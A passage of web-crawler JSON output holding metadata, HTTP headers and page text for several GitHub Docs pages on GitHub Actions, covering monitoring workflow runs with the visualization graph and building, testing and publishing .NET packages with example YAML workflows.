    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows",
    "loadedTime": "2025-05-08T06:41:05.307Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows",
    "title": "Monitoring and troubleshooting workflows - GitHub Docs",
    "description": "You can view the status and results of each step in your workflow, debug a failed workflow, and search and download logs.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Monitoring and troubleshooting workflows - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "D2B3:1E744F:F06911:1399076:681C51F9",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:40:57 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686457.221829, VS0, VE336",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23260",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Monitoring and troubleshooting workflows - GitHub Docs\nYou can view the status and results of each step in your workflow, debug a failed workflow, and search and download logs.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-wkfnik.html",
  "markdown": "# Monitoring and troubleshooting workflows - GitHub Docs\n\nYou can view the status and results of each step in your workflow, debug a failed workflow, and search and download logs.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 236,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 3106,
      "readableText": 380,
      "none": 25687,
      "readableTextIfPossible": 25687,
      "result": 380,
      "markdown": 179
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph",
    "loadedTime": "2025-05-08T06:41:20.823Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph",
    "title": "Using the visualization graph - GitHub Docs",
    "description": "Every workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using the visualization graph - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/using-the-visualization-graph"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "24217",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BD05:2A184:55F922:73761D:681C1C82",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "13677",
      "date": "Thu, 08 May 2025 06:41:20 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000045-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686481.721888,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Using the visualization graph - GitHub Docs\nEvery workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nThe graph displays each job in the workflow. An icon to the left of the job name indicates the status of the job. Lines between jobs indicate dependencies.\nTo view a job's log, click the job.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-3e1.html",
  "markdown": "# Using the visualization graph - GitHub Docs\n\nEvery workflow run generates a real-time graph that illustrates the run progress. You can use this graph to monitor and debug workflows.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  The graph displays each job in the workflow. An icon to the left of the job name indicates the status of the job. Lines between jobs indicate dependencies.\n    \n    ![Screenshot of the visualization graph of a workflow run.](https://docs.github.com/assets/cb-63715/images/help/actions/workflow-graph.png)\n    \n6.  To view a job's log, click the job.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 199,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-monitoring-and-troubleshooting-workflows-monitoring-workflows-using-the-visualization-graph-readableTextIfPossibleH"
    },
    "lengths": {
      "extractus": 1932,
      "readableText": 2159,
      "none": 3594,
      "readableTextIfPossible": 3594,
      "result": 2159,
      "markdown": 1258
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net",
    "loadedTime": "2025-05-08T06:41:23.316Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net",
    "title": "Building and testing .NET - GitHub Docs",
    "description": "You can create a continuous integration (CI) workflow to build and test your .NET project.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Building and testing .NET - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/building-and-testing/building-and-testing-net"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "29076",
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "5A28:214E50:769E9F:9B8711:681C1151",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "16578",
      "date": "Thu, 08 May 2025 06:41:23 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-iad-kiad7000045-IAD",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686483.239313,VS0,VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600"
    }
  },
  "screenshotUrl": null,
  "text": "Building and testing .NET - GitHub Docs\nYou can create a continuous integration (CI) workflow to build and test your .NET project.\nIntroduction\nThis guide shows you how to build, test, and publish a .NET package.\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the .NET Core SDK. For a full list of up-to-date software and the preinstalled versions of .NET Core SDK, see software installed on GitHub-hosted runners.\nPrerequisites\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see Workflow syntax for GitHub Actions.\nWe recommend that you have a basic understanding of the .NET Core SDK. For more information, see Getting started with .NET.\nUsing a .NET workflow template\nTo get started quickly, add a workflow template to the .github/workflows directory of your repository.\nGitHub provides a workflow template for .NET that should work for most .NET projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIf you already have a workflow in your repository, click New workflow.\nThe \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"dotnet\".\nOn the \".NET\" workflow, click Configure.\nEdit the workflow as required. For example, change the .NET version.\nClick Commit changes.\nThe dotnet.yml workflow file is added to the .github/workflows directory of your repository.\nSpecifying a .NET version\nTo use a preinstalled version of the .NET Core SDK on a GitHub-hosted runner, use the setup-dotnet action. This action finds a specific version of .NET from the tools cache on each runner, and adds the necessary binaries to PATH. These changes will persist for the remainder of the job.\nThe setup-dotnet action is the recommended way of using .NET with GitHub Actions, because it ensures consistent behavior across different runners and different versions of .NET. If you are using a self-hosted runner, you must install .NET and add it to PATH. For more information, see the setup-dotnet action.\nUsing multiple .NET versions\nname: dotnet package on: [push] jobs: build: runs-on: ubuntu-latest strategy: matrix: dotnet-version: [ '3.1.x', '6.0.x' ] steps: - uses: actions/checkout@v4 - name: Setup dotnet ${{ matrix.dotnet-version }} uses: actions/setup-dotnet@v4 with: dotnet-version: ${{ matrix.dotnet-version }} # You can test your matrix by printing the current dotnet version - name: Display dotnet version run: dotnet --version \nUsing a specific .NET version\nYou can configure your job to use a specific version of .NET, such as 6.0.22. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest minor release of .NET 6.\n- name: Setup .NET 6.x uses: actions/setup-dotnet@v4 with: # Semantic version range syntax or exact version of a dotnet version dotnet-version: '6.x' \nInstalling dependencies\nGitHub-hosted runners have the NuGet package manager installed. You can use the dotnet CLI to install dependencies from the NuGet package registry before building and testing your code. For example, the YAML below installs the Newtonsoft package.\nsteps: - uses: actions/checkout@v4 - name: Setup dotnet uses: actions/setup-dotnet@v4 with: dotnet-version: '6.0.x' - name: Install dependencies run: dotnet add package Newtonsoft.Json --version 12.0.1 \nCaching dependencies\nYou can cache NuGet dependencies for future workflows using the optional cache input. For example, the YAML below caches the NuGet global-packages folder, and then installs the Newtonsoft package. A second optional input, cache-dependency-path, can be used to specify the path to a dependency file: packages.lock.json.\nFor more information, see Caching dependencies to speed up workflows.\nsteps: - uses: actions/checkout@v4 - name: Setup dotnet uses: actions/setup-dotnet@v4 with: dotnet-version: '6.x' cache: true - name: Install dependencies run: dotnet add package Newtonsoft.Json --version 12.0.1 \nNote\nDepending on the number of dependencies, it may be faster to use the dependency cache. Projects with many large dependencies should see a performance increase as it cuts down the time required for downloading. Projects with fewer dependencies may not see a significant performance increase and may even see a slight decrease due to how NuGet installs cached dependencies. The performance varies from project to project.\nBuilding and testing your code\nYou can use the same commands that you use locally to build and test your code. This example demonstrates how to use dotnet build and dotnet test in a job:\nsteps: - uses: actions/checkout@v4 - name: Setup dotnet uses: actions/setup-dotnet@v4 with: dotnet-version: '6.0.x' - name: Install dependencies run: dotnet restore - name: Build run: dotnet build --no-restore - name: Test with the dotnet CLI run: dotnet test --no-build \nPackaging workflow data as artifacts\nAfter a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use the upload-artifact action to upload test results.\nFor more information, see Storing and sharing data from a workflow.\nname: dotnet package on: [push] jobs: build: runs-on: ubuntu-latest strategy: matrix: dotnet-version: [ '3.1.x', '6.0.x' ] steps: - uses: actions/checkout@v4 - name: Setup dotnet uses: actions/setup-dotnet@v4 with: dotnet-version: ${{ matrix.dotnet-version }} - name: Install dependencies run: dotnet restore - name: Test with dotnet run: dotnet test --no-restore --logger trx --results-directory \"TestResults-${{ matrix.dotnet-version }}\" - name: Upload dotnet test results uses: actions/upload-artifact@v4 with: name: dotnet-results-${{ matrix.dotnet-version }} path: TestResults-${{ matrix.dotnet-version }} # Use always() to always run this step to publish test results when there are test failures if: ${{ always() }} \nPublishing to package registries\nYou can configure your workflow to publish your .NET package to a package registry when your CI tests pass. You can use repository secrets to store any tokens or credentials needed to publish your binary. The following example creates and publishes a package to GitHub Packages using dotnet core cli.\nname: Upload dotnet package on: release: types: [created] jobs: deploy: runs-on: ubuntu-latest permissions: packages: write contents: read steps: - uses: actions/checkout@v4 - uses: actions/setup-dotnet@v4 with: dotnet-version: '6.0.x' # SDK Version to use. source-url: https://nuget.pkg.github.com/<owner>/index.json env: NUGET_AUTH_TOKEN: ${{secrets.GITHUB_TOKEN}} - run: dotnet build --configuration Release <my project> - name: Create the package run: dotnet pack --configuration Release <my project> - name: Publish the package to GPR run: dotnet nuget push <my project>/bin/Release/*.nupkg",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-zj3wk.html",
  "markdown": "# Building and testing .NET - GitHub Docs\n\nYou can create a continuous integration (CI) workflow to build and test your .NET project.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to build, test, and publish a .NET package.\n\nGitHub-hosted runners have a tools cache with preinstalled software, which includes the .NET Core SDK. For a full list of up-to-date software and the preinstalled versions of .NET Core SDK, see [software installed on GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners).\n\n## [Prerequisites](#prerequisites)\n\nYou should already be familiar with YAML syntax and how it's used with GitHub Actions. For more information, see [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions).\n\nWe recommend that you have a basic understanding of the .NET Core SDK. For more information, see [Getting started with .NET](https://dotnet.microsoft.com/learn).\n\n## [Using a .NET workflow template](#using-a-net-workflow-template)\n\nTo get started quickly, add a workflow template to the `.github/workflows` directory of your repository.\n\nGitHub provides a workflow template for .NET that should work for most .NET projects. The subsequent sections of this guide give examples of how you can customize this workflow template.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  If you already have a workflow in your repository, click **New workflow**.\n    \n4.  The \"Choose a workflow\" page shows a selection of recommended workflow templates. Search for \"dotnet\".\n    \n5.  On the \".NET\" workflow, click **Configure**.\n    \n6.  Edit the workflow as required. For example, change the .NET version.\n    \n7.  Click **Commit changes**.\n    \n    The `dotnet.yml` workflow file is added to the `.github/workflows` directory of your repository.\n    \n\n## [Specifying a .NET version](#specifying-a-net-version)\n\nTo use a preinstalled version of the .NET Core SDK on a GitHub-hosted runner, use the `setup-dotnet` action. This action finds a specific version of .NET from the tools cache on each runner, and adds the necessary binaries to `PATH`. These changes will persist for the remainder of the job.\n\nThe `setup-dotnet` action is the recommended way of using .NET with GitHub Actions, because it ensures consistent behavior across different runners and different versions of .NET. If you are using a self-hosted runner, you must install .NET and add it to `PATH`. For more information, see the [`setup-dotnet`](https://github.com/marketplace/actions/setup-net-core-sdk) action.\n\n### [Using multiple .NET versions](#using-multiple-net-versions)\n\n```\nname: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup dotnet ${{ matrix.dotnet-version }}\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ matrix.dotnet-version }}\n      # You can test your matrix by printing the current dotnet version\n      - name: Display dotnet version\n        run: dotnet --version\n```\n\n### [Using a specific .NET version](#using-a-specific-net-version)\n\nYou can configure your job to use a specific version of .NET, such as `6.0.22`. Alternatively, you can use semantic version syntax to get the latest minor release. This example uses the latest minor release of .NET 6.\n\n```\n    - name: Setup .NET 6.x\n      uses: actions/setup-dotnet@v4\n      with:\n        # Semantic version range syntax or exact version of a dotnet version\n        dotnet-version: '6.x'\n```\n\n## [Installing dependencies](#installing-dependencies)\n\nGitHub-hosted runners have the NuGet package manager installed. You can use the dotnet CLI to install dependencies from the NuGet package registry before building and testing your code. For example, the YAML below installs the `Newtonsoft` package.\n\n```\nsteps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1\n```\n\n### [Caching dependencies](#caching-dependencies)\n\nYou can cache NuGet dependencies for future workflows using the optional `cache` input. For example, the YAML below caches the NuGet `global-packages` folder, and then installs the `Newtonsoft` package. A second optional input, `cache-dependency-path`, can be used to specify the path to a dependency file: `packages.lock.json`.\n\nFor more information, see [Caching dependencies to speed up workflows](https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows).\n\n```\nsteps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.x'\n    cache: true\n- name: Install dependencies\n  run: dotnet add package Newtonsoft.Json --version 12.0.1\n```\n\nNote\n\nDepending on the number of dependencies, it may be faster to use the dependency cache. Projects with many large dependencies should see a performance increase as it cuts down the time required for downloading. Projects with fewer dependencies may not see a significant performance increase and may even see a slight decrease due to how NuGet installs cached dependencies. The performance varies from project to project.\n\n## [Building and testing your code](#building-and-testing-your-code)\n\nYou can use the same commands that you use locally to build and test your code. This example demonstrates how to use `dotnet build` and `dotnet test` in a job:\n\n```\nsteps:\n- uses: actions/checkout@v4\n- name: Setup dotnet\n  uses: actions/setup-dotnet@v4\n  with:\n    dotnet-version: '6.0.x'\n- name: Install dependencies\n  run: dotnet restore\n- name: Build\n  run: dotnet build --no-restore\n- name: Test with the dotnet CLI\n  run: dotnet test --no-build\n```\n\n## [Packaging workflow data as artifacts](#packaging-workflow-data-as-artifacts)\n\nAfter a workflow completes, you can upload the resulting artifacts for analysis. For example, you may need to save log files, core dumps, test results, or screenshots. The following example demonstrates how you can use the `upload-artifact` action to upload test results.\n\nFor more information, see [Storing and sharing data from a workflow](https://docs.github.com/en/actions/using-workflows/storing-workflow-data-as-artifacts).\n\n```\nname: dotnet package\n\non: [push]\n\njobs:\n  build:\n\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        dotnet-version: [ '3.1.x', '6.0.x' ]\n\n      steps:\n        - uses: actions/checkout@v4\n        - name: Setup dotnet\n          uses: actions/setup-dotnet@v4\n          with:\n            dotnet-version: ${{ matrix.dotnet-version }}\n        - name: Install dependencies\n          run: dotnet restore\n        - name: Test with dotnet\n          run: dotnet test --no-restore --logger trx --results-directory \"TestResults-${{ matrix.dotnet-version }}\"\n        - name: Upload dotnet test results\n          uses: actions/upload-artifact@v4\n          with:\n            name: dotnet-results-${{ matrix.dotnet-version }}\n            path: TestResults-${{ matrix.dotnet-version }}\n          # Use always() to always run this step to publish test results when there are test failures\n          if: ${{ always() }}\n```\n\n## [Publishing to package registries](#publishing-to-package-registries)\n\nYou can configure your workflow to publish your .NET package to a package registry when your CI tests pass. You can use repository secrets to store any tokens or credentials needed to publish your binary. The following example creates and publishes a package to GitHub Packages using `dotnet core cli`.\n\n```\nname: Upload dotnet package\n\non:\n  release:\n    types: [created]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '6.0.x' # SDK Version to use.\n          source-url: https://nuget.pkg.github.com/<owner>/index.json\n        env:\n          NUGET_AUTH_TOKEN: ${{secrets.GITHUB_TOKEN}}\n      - run: dotnet build --configuration Release <my project>\n      - name: Create the package\n        run: dotnet pack --configuration Release <my project>\n      - name: Publish the package to GPR\n        run: dotnet nuget push <my project>/bin/Release/*.nupkg\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 224,
    "response": {},
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-building-and-testing-building-and-testing-net-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 15186,
      "readableText": 14159,
      "none": 22267,
      "readableTextIfPossible": 14159,
      "result": 14159,
      "markdown": 8774
    },
    "requestHandlerMode": "http"
  }
},
{
  "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge",
    "loadedTime": "2025-05-08T06:41:26.124Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge",
    "title": "Adding a workflow status badge - GitHub Docs",
    "description": "You can display a status badge in your repository to indicate the status of your workflows.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Adding a workflow status badge - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/adding-a-workflow-status-badge"
      }
    ],
    "jsonLd": null,
    "headers": {
      "connection": "keep-alive",
      "content-length": "26609",
      "access-control-allow-origin": "*",
